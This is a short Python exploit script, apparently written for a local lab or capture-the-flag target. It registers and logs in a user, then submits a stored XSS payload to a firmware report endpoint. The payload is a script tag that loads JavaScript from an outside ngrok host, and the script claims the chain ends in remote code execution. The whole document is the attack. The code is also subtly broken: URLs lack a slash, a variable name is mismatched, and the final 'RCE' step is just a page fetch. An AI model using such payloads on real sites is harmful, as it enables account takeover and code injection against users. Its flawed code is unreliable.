# A exploit that uses the API to send the XSS



import requests


url = "http://localhost:8000"



# oAuth



r = requests.post(url + "api/register", json = {"username":"rootjkqsta","password":"password"})
r = requests.post(url +  "api/login", json = {"username": "rootjkqsta",  "password": "password"})
cookies = r.cookies["session"]



# And Send the XSS 



r = requests.post(
    url + "api/firmware/report",
    cookies = {"session": cookie},
    json = {
        "module_id": "1",
        "issue": "<script src='http://ngrok.io/content/lol.js'></script>"

    }
)


# And finally get the RCE


r = requests.get(url + "register")
print(r.text)
